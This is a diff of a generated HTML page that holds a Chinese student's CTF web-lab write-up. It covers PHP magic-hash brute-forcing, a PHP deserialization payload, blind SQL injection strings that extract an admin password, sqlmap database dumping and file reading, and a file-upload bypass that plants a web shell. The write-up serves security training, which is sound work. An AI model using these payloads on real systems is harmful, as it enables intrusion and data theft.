@@ -408,6 +408,8 @@
       
         
       
+        
+      
     
     
       
@@ -688,6 +690,65 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ADS/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    DS
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            DS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -713,10 +774,10 @@
   
 
 
-<h1 id="web-lab-3">Web Lab 3<a class="headerlink" href="#web-lab-3" title="Permanent link">&para;</a></h1>
-<h2 id="1-task-1">1. Task 1<a class="headerlink" href="#1-task-1" title="Permanent link">&para;</a></h2>
+<div><h1 id="web-lab-3">Web Lab 3<a class="headerlink" href="#web-lab-3" title="Permanent link">¶</a></h1>
+<h2 id="1-task-1">1. Task 1<a class="headerlink" href="#1-task-1" title="Permanent link">¶</a></h2>
 <p>编写简单脚本进行爆破，在字母和数字中查找：</p>
-<p><img alt="1721021728565" src="../image/WebLab3/1721021728565.png" /></p>
+<p><img alt="1721021728565" src="../image/WebLab3/1721021728565.png"></p>
 <p>初步爆破后发现满足条件的字符串很难找到，于是改变思路使用纯数字来查找，并开多进程来加快遍历速度，最后得到：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
@@ -797,13 +858,13 @@
 <a id="__codelineno-0-39" name="__codelineno-0-39"></a>以0e开头的字符串: 9649691098 -&gt; 0e328279307319758042675961049087
 </code></pre></div></td></tr></table></div>
 <p>不过上面似乎都是0e开头的，'or开头的不太好找。</p>
-<h2 id="2-task-2areuserialz">2. Task 2:AreUSerialz<a class="headerlink" href="#2-task-2areuserialz" title="Permanent link">&para;</a></h2>
-<h3 id="21">2.1. 分析<a class="headerlink" href="#21" title="Permanent link">&para;</a></h3>
+<h2 id="2-task-2areuserialz">2. Task 2:AreUSerialz<a class="headerlink" href="#2-task-2areuserialz" title="Permanent link">¶</a></h2>
+<h3 id="21">2.1. 分析<a class="headerlink" href="#21" title="Permanent link">¶</a></h3>
 <p>从标题中可以看出，这道题考查的是反序列化。打开靶机，题目直接给了我们源码。</p>
 <p>分析代码可知，这段代码里有一个FileHandler的类，里面有三个protected的变量：op保存操作，filename保存文件名，content保存内容。文件开头include了一个flag.php，因此这道题的思路就是想办法读取flag.php的内容。</p>
 <p>类中process可以根据op执行不同的操作，1执行write，2执行read，而且都是弱比较类型。我们的目标是读取，只需要关注read操作即可，read()函数读取filename的文件，因此我们构造的payload需要将filename设置成"flag.php"。</p>
 <p>在做反序列化的时候会触发一个__destruct()的魔法函数，其中会对op进行判定，用强比较的方式和"2"进行比对，如果一致就会被改成1，后续还会把content清空，并执行processed()，而process()中又会执行read()，我们就能得到指定内容了。这意味着我们不能使用和"2"相同的op，由于强比较会判定两者类型是否一致，只需要用int类型的2作为op就能绕过了；又因为content始终会被清空，我们也就不需要输入任何的content。</p>
-<h3 id="22">2.2. 尝试<a class="headerlink" href="#22" title="Permanent link">&para;</a></h3>
+<h3 id="22">2.2. 尝试<a class="headerlink" href="#22" title="Permanent link">¶</a></h3>
 <p>根据以上构造payload，用以下代码构造：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
@@ -819,7 +880,7 @@
 <a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="cp">&lt;?php</span>
 <a id="__codelineno-1-3" name="__codelineno-1-3"></a>  <span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
 <a id="__codelineno-1-4" name="__codelineno-1-4"></a>  <span class="k">protected</span> <span class="nv">$op</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
-<a id="__codelineno-1-5" name="__codelineno-1-5"></a>  <span class="k">protected</span> <span class="nv">$filename</span> <span class="o">=</span><span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5"></a>  <span class="k">protected</span> <span class="nv">$filename</span> <span class="o">=</span><span class="s1">'flag.php'</span><span class="p">;</span>
 <a id="__codelineno-1-6" name="__codelineno-1-6"></a>  <span class="k">protected</span> <span class="nv">$content</span><span class="p">;</span>
 <a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="p">}</span>
 <a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
@@ -830,7 +891,7 @@
 <p>但是用这个返回的结果作为payload是无法成功的，直接返回了Bad Hacker。回头思考的时候发现源码中还有一个is_valid的函数，这个函数检测到全部输入是在32到125之间的时候才会进行反序列化操作。而protected类型的变量在序列化的时候会有%00的字节输出，我在复制payload的时候是复制不了%00的，所以虽然阴差阳错地过了is_valid的函数，但是反序列化的时候还是会出问题的（没有%00，无法正常读入protected）。</p>
 <p>三种类型中只有public才不会在序列化的时候输出%00，如果能直接作为public类型输入就好了。</p>
 <p>在Burp Suite内查看响应报文可以看到服务器的PHP版本是PHP/7.4.3。</p>
-<p><img alt="1721035011516" src="../image/WebLab3/1721035011516.png" /></p>
+<p><img alt="1721035011516" src="../image/WebLab3/1721035011516.png"></p>
 <p>在本地用版本相近的PHP7.3.4试了一下，发现public类型可以输入，因此重新构造：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
@@ -846,7 +907,7 @@
 <a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="cp">&lt;?php</span>
 <a id="__codelineno-2-3" name="__codelineno-2-3"></a>  <span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
 <a id="__codelineno-2-4" name="__codelineno-2-4"></a>  <span class="k">public</span> <span class="nv">$op</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
-<a id="__codelineno-2-5" name="__codelineno-2-5"></a>  <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span><span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a>  <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span><span class="s1">'flag.php'</span><span class="p">;</span>
 <a id="__codelineno-2-6" name="__codelineno-2-6"></a>  <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
 <a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="p">}</span>
 <a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
@@ -857,22 +918,22 @@
 <p>这次尝试成功，将上面的代码输出的payload <code>O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}</code>的前面加上 <code>?str=</code></p>
 <p>即 <code>?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}</code></p>
 <p>用其修改报文，向服务器发送，拿到了flag：</p>
-<p><img alt="1721036170404" src="../image/WebLab3/1721036170404.png" /></p>
+<p><img alt="1721036170404" src="../image/WebLab3/1721036170404.png"></p>
 <p>在平台上提交flag完成通过：</p>
-<p><img alt="1721036261827" src="../image/WebLab3/1721036261827.png" /></p>
-<h2 id="3-task-3">3. Task 3<a class="headerlink" href="#3-task-3" title="Permanent link">&para;</a></h2>
-<h3 id="31-part-1">3.1. Part 1<a class="headerlink" href="#31-part-1" title="Permanent link">&para;</a></h3>
+<p><img alt="1721036261827" src="../image/WebLab3/1721036261827.png"></p>
+<h2 id="3-task-3">3. Task 3<a class="headerlink" href="#3-task-3" title="Permanent link">¶</a></h2>
+<h3 id="31-part-1">3.1. Part 1<a class="headerlink" href="#31-part-1" title="Permanent link">¶</a></h3>
 <p>浏览了一下网页，能输入内容的只有migrate和index，而且migrate输入后会跳转到index，应该是处于不可用的状态。</p>
 <p>在rank里找到了管理员的名字：admin</p>
-<p><img alt="1721384830692" src="../image/WebLab3/1721384830692.png" /></p>
+<p><img alt="1721384830692" src="../image/WebLab3/1721384830692.png"></p>
 <p>尝试注入，当输入奇数个单引号时出现报错，猜测是字符型输入，而且给出了报错回显：Call to a member function fetch_assoc() on boolean in /home/web/www.zjusec.com/index.php:176，从中可以判断文件路径，或许后面能用上。</p>
 <p>接着用万能密码尝试登入：</p>
-<p><img alt="1721466491397" src="../image/WebLab3/1721466491397.png" /></p>
+<p><img alt="1721466491397" src="../image/WebLab3/1721466491397.png"></p>
 <p>显示登录成功："Login success!"，再次尝试登录得到已登录的提示，看来如果要注入的话需要每次将cookie清空。</p>
-<p><img alt="1721466509536" src="../image/WebLab3/1721466509536.png" /></p>
+<p><img alt="1721466509536" src="../image/WebLab3/1721466509536.png"></p>
 <p>不过令人沮丧的是，这道题要求用管理员用户登录。因此需要想办法找到管理员密码。</p>
 <p>测试中发现用户名长度受限，对我们的注入带来了巨大的不便，测试发现最多只能输入10位字符。</p>
-<p><img alt="1721467415498" src="../image/WebLab3/1721467415498.png" /></p>
+<p><img alt="1721467415498" src="../image/WebLab3/1721467415498.png"></p>
 <p>因此想办法让注入语句调整到password段中，因为password没有限制长度。经过测试，username='or 1/*&amp;password=*/#能够正常输出，说明构造成功，于是紧接着构造成username='/<em>&amp;password=</em>/ or 1=1#，替换1=1部分就能实现布尔盲注了</p>
 <p>首先爆破数据库名，测长度和对应的字符：</p>
 <p>username='/*&amp;password=*/ or length(database())=6 #</p>
@@ -891,11 +952,11 @@
 <span class="normal"><a href="#__codelineno-3-2">2</a></span>
 <span class="normal"><a href="#__codelineno-3-3">3</a></span>
 <span class="normal"><a href="#__codelineno-3-4">4</a></span>
-<span class="normal"><a href="#__codelineno-3-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>username=&#39;/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),1,1))=85 #
-<a id="__codelineno-3-2" name="__codelineno-3-2"></a>username=&#39;/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),2,1))=83 #
-<a id="__codelineno-3-3" name="__codelineno-3-3"></a>username=&#39;/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),3,1))=69 #
-<a id="__codelineno-3-4" name="__codelineno-3-4"></a>username=&#39;/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),4,1))=82 #
-<a id="__codelineno-3-5" name="__codelineno-3-5"></a>username=&#39;/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),5,1))=83 #
+<span class="normal"><a href="#__codelineno-3-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a>username='/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),1,1))=85 #
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a>username='/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),2,1))=83 #
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a>username='/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),3,1))=69 #
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a>username='/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),4,1))=82 #
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a>username='/*&amp;password=*/ or ascii(substr(((select table_name from information_schema.tables where table_schema=database() limit 0,1)),5,1))=83 #
 </code></pre></div></td></tr></table></div>
 <p>转换后得到表名为：USERS</p>
 <p>下一步爆列名：</p>
@@ -906,78 +967,78 @@
 <span class="normal"><a href="#__codelineno-4-5">5</a></span>
 <span class="normal"><a href="#__codelineno-4-6">6</a></span>
 <span class="normal"><a href="#__codelineno-4-7">7</a></span>
-<span class="normal"><a href="#__codelineno-4-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>username=&#39;/*&amp;password=*/ or (select COUNT(*) from information_schema.columns where table_schema=database() limit 1)=3 #
-<a id="__codelineno-4-2" name="__codelineno-4-2"></a>username=&#39;/*&amp;password=*/ union select * from USERS #
-<a id="__codelineno-4-3" name="__codelineno-4-3"></a>username=&#39;/*&amp;password=*/ or (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x5553455253)=3 #
+<span class="normal"><a href="#__codelineno-4-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a>username='/*&amp;password=*/ or (select COUNT(*) from information_schema.columns where table_schema=database() limit 1)=3 #
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a>username='/*&amp;password=*/ union select * from USERS #
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a>username='/*&amp;password=*/ or (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x5553455253)=3 #
 <a id="__codelineno-4-4" name="__codelineno-4-4"></a>length((select column_name from information_schema.columns where table_schema=database() and table_name=0x5553455253 limit 0,1))=8 #
 <a id="__codelineno-4-5" name="__codelineno-4-5"></a>length((select column_name from information_schema.columns where table_schema=database() and table_name=0x5553455253 limit 1,1))=8 #
 <a id="__codelineno-4-6" name="__codelineno-4-6"></a>length((select column_name from information_schema.columns where table_schema=database() and table_name=0x5553455253 limit 2,1))=4 #
-<a id="__codelineno-4-7" name="__codelineno-4-7"></a>username=&#39;/*&amp;password=*/ or ascii(substr(((select column_name from information_schema.columns where table_schema=database() and table_name=0x5553455253 limit 0,1)),8,1))=101 #
-<a id="__codelineno-4-8" name="__codelineno-4-8"></a>username=&#39;/*&amp;password=*/ or (select count(password) from USERS)=1 #
+<a id="__codelineno-4-7" name="__codelineno-4-7"></a>username='/*&amp;password=*/ or ascii(substr(((select column_name from information_schema.columns where table_schema=database() and table_name=0x5553455253 limit 0,1)),8,1))=101 #
+<a id="__codelineno-4-8" name="__codelineno-4-8"></a>username='/*&amp;password=*/ or (select count(password) from USERS)=1 #
 </code></pre></div></td></tr></table></div>
 <p>从上面的结果判断有3列，分别为：username，password，data，这个表只有一行且username理应就是admin。</p>
 <p>接下来手动把password爆出来：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
-<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a>username=&#39;/*&amp;password=*/ or length((select password from USERS limit 0,1))=26 #
-<a id="__codelineno-5-2" name="__codelineno-5-2"></a>username=&#39;/*&amp;password=*/ or ascii(substr((select password from USERS limit 0,1),26,1))&gt;105#
+<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a>username='/*&amp;password=*/ or length((select password from USERS limit 0,1))=26 #
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a>username='/*&amp;password=*/ or ascii(substr((select password from USERS limit 0,1),26,1))&gt;105#
 </code></pre></div></td></tr></table></div>
 <p>一阵忙活后得到了密码：</p>
-<p><img alt="1721476805893" src="../image/WebLab3/1721476805893.png" /></p>
+<p><img alt="1721476805893" src="../image/WebLab3/1721476805893.png"></p>
 <p>密码为：zhegemimanigujicaibuchulai（ps：确实是猜不出来啊）</p>
 <p>登入管理员帐号：</p>
-<p><img alt="1721476733733" src="../image/WebLab3/1721476733733.png" /></p>
+<p><img alt="1721476733733" src="../image/WebLab3/1721476733733.png"></p>
 <p>在继续深入之前先把data也爆了：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
-<span class="normal"><a href="#__codelineno-6-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>username=&#39;/*&amp;password=*/ or length((select data from USERS limit 0,1))=16 #
-<a id="__codelineno-6-2" name="__codelineno-6-2"></a>username=&#39;/*&amp;password=*/ or ascii(substr((select data from USERS limit 0,1),16,1))&gt; 116 #
+<span class="normal"><a href="#__codelineno-6-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>username='/*&amp;password=*/ or length((select data from USERS limit 0,1))=16 #
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a>username='/*&amp;password=*/ or ascii(substr((select data from USERS limit 0,1),16,1))&gt; 116 #
 </code></pre></div></td></tr></table></div>
 <p>转换后是：This is a secret（本以为data就是flag来着）</p>
 <p>现在只剩migrate能用了，试着输入admin，输出了data字段：</p>
-<p><img alt="1721478123653" src="../image/WebLab3/1721478123653.png" /></p>
+<p><img alt="1721478123653" src="../image/WebLab3/1721478123653.png"></p>
 <p>因此得知：相比起登录时的布尔回显，这里的回显能够获得更多的信息，于是尝试了多种方式来爆数据。</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
 <span class="normal"><a href="#__codelineno-7-2">2</a></span>
 <span class="normal"><a href="#__codelineno-7-3">3</a></span>
-<span class="normal"><a href="#__codelineno-7-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>&#39; or length(database())=6#
-<a id="__codelineno-7-2" name="__codelineno-7-2"></a>&#39; or (select COUNT(*) from information_schema.tables where table_schema=database())=1#
-<a id="__codelineno-7-3" name="__codelineno-7-3"></a>&#39; or (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x5553455253)=3 #
-<a id="__codelineno-7-4" name="__codelineno-7-4"></a>&#39; or ascii(substr((select data from USERS limit 0,1),16,1))= 116 #
+<span class="normal"><a href="#__codelineno-7-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>' or length(database())=6#
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a>' or (select COUNT(*) from information_schema.tables where table_schema=database())=1#
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a>' or (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x5553455253)=3 #
+<a id="__codelineno-7-4" name="__codelineno-7-4"></a>' or ascii(substr((select data from USERS limit 0,1),16,1))= 116 #
 </code></pre></div></td></tr></table></div>
 <p>然而最后得到的结果却和index的差不多，陷入了瓶颈。</p>
 <p>后来想到这个数据库可能还有更多的数据，然而手动去爆库工作量过于大，于是使用sqlmap来做批量化脱库。</p>
 <p>首先检查了一下数据库，发现和我之前得到的是一致的：</p>
-<p><img alt="1721642683941" src="../image/WebLab3/1721642683941.png" /></p>
+<p><img alt="1721642683941" src="../image/WebLab3/1721642683941.png"></p>
 <p>进一步脱库后检索出了有用的内容，说明这个网站隐藏了一个php入口，但是直接访问这个链接却没有返回flag。</p>
-<p><img alt="1721648189773" src="../image/WebLab3/1721648189773.png" /></p>
+<p><img alt="1721648189773" src="../image/WebLab3/1721648189773.png"></p>
 <p>必须想办法得到源码，于是使用python .\sqlmap.py -r .\migrate.txt --file-read=""语句来获取文件，最后下载成功，得到以下的flag：</p>
-<p><img alt="1721648158270" src="../image/WebLab3/1721648158270.png" /></p>
+<p><img alt="1721648158270" src="../image/WebLab3/1721648158270.png"></p>
 <p>输入到校巴验证：</p>
-<p><img alt="1721648091434" src="../image/WebLab3/1721648091434.png" /></p>
-<h3 id="32-part-2">3.2. Part 2<a class="headerlink" href="#32-part-2" title="Permanent link">&para;</a></h3>
+<p><img alt="1721648091434" src="../image/WebLab3/1721648091434.png"></p>
+<h3 id="32-part-2">3.2. Part 2<a class="headerlink" href="#32-part-2" title="Permanent link">¶</a></h3>
 <p>对MySQL进行彻底的脱库，翻找日志文件后找到了nginx的服务配置文件：</p>
-<p><img alt="1721652292715" src="../image/WebLab3/1721652292715.png" /></p>
+<p><img alt="1721652292715" src="../image/WebLab3/1721652292715.png"></p>
 <p>打开后找到了第二题的入口：http://admin-writeup-test.actf.lol/</p>
-<p><img alt="1721652243615" src="../image/WebLab3/1721652243615.png" /></p>
+<p><img alt="1721652243615" src="../image/WebLab3/1721652243615.png"></p>
 <p>尝试用sqlmap来下载对应目录下的flag.php，flag.txt均告失败，说明没有权限直接下载。</p>
 <p>访问网页：</p>
-<p><img alt="1721652269712" src="../image/WebLab3/1721652269712.png" /></p>
+<p><img alt="1721652269712" src="../image/WebLab3/1721652269712.png"></p>
 <p>看来这是一个文件上传漏洞的利用，首先得找到源码：</p>
-<p><img alt="1721664016041" src="../image/WebLab3/1721664016041.png" /></p>
+<p><img alt="1721664016041" src="../image/WebLab3/1721664016041.png"></p>
 <p>文件上传最大为500kb，要求格式为pdf，但是我们需要上传php文件，需要找到绕过方法。</p>
 <p>我们可以通过在Burp Suite修改发送包中的类型来绕过类型检查，代码中把&lt;?php换成等价的短标签语句来绕过&lt;?php的检查，然而前面的配置文件中Nginx还有对.php后缀的检查，但是检查存在漏洞，下面的语句告诉我们可以使用.ptml来绕过类型检查。</p>
 <p>至此，我们完成了三个绕过，从而构造一句话木马：</p>
-<p><img alt="1721739699538" src="../image/WebLab3/1721739699538.png" /></p>
+<p><img alt="1721739699538" src="../image/WebLab3/1721739699538.png"></p>
 <p>然而因为本地报毒，折腾了好一会儿，绕了一个大弯，不过最后还是成功地上传了木马文件。</p>
-<p><img alt="1721740257978" src="../image/WebLab3/1721740257978.png" /></p>
+<p><img alt="1721740257978" src="../image/WebLab3/1721740257978.png"></p>
 <p>最后使用中国蚁剑来连接，成功获得了后端的控制权：</p>
-<p><img alt="1721674405889" src="../image/WebLab3/1721674405889.png" /></p>
+<p><img alt="1721674405889" src="../image/WebLab3/1721674405889.png"></p>
 <p>退到上一级后就能找到flag文件了：</p>
-<p><img alt="1721674427541" src="../image/WebLab3/1721674427541.png" /></p>
+<p><img alt="1721674427541" src="../image/WebLab3/1721674427541.png"></p>
 <p>将flag输入到校巴中验证：</p>
-<p><img alt="1721674446450" src="../image/WebLab3/1721674446450.png" /></p>
-<h2 id="4-bonus">4. Bonus<a class="headerlink" href="#4-bonus" title="Permanent link">&para;</a></h2>
+<p><img alt="1721674446450" src="../image/WebLab3/1721674446450.png"></p>
+<h2 id="4-bonus">4. Bonus<a class="headerlink" href="#4-bonus" title="Permanent link">¶</a></h2>
 <p>完成以上题目的时候，只释出了两个hint。</p>
-<p>在学习过程中，为了方便学习记录，搭建了一个简单的个人博客，里面的内容比较少：<a href="https://jabofish.github.io/blogs/">https://jabofish.github.io/blogs/</a></p>
+<p>在学习过程中，为了方便学习记录，搭建了一个简单的个人博客，里面的内容比较少：<a href="https://jabofish.github.io/blogs/">https://jabofish.github.io/blogs/</a></p></div>
 
 
 
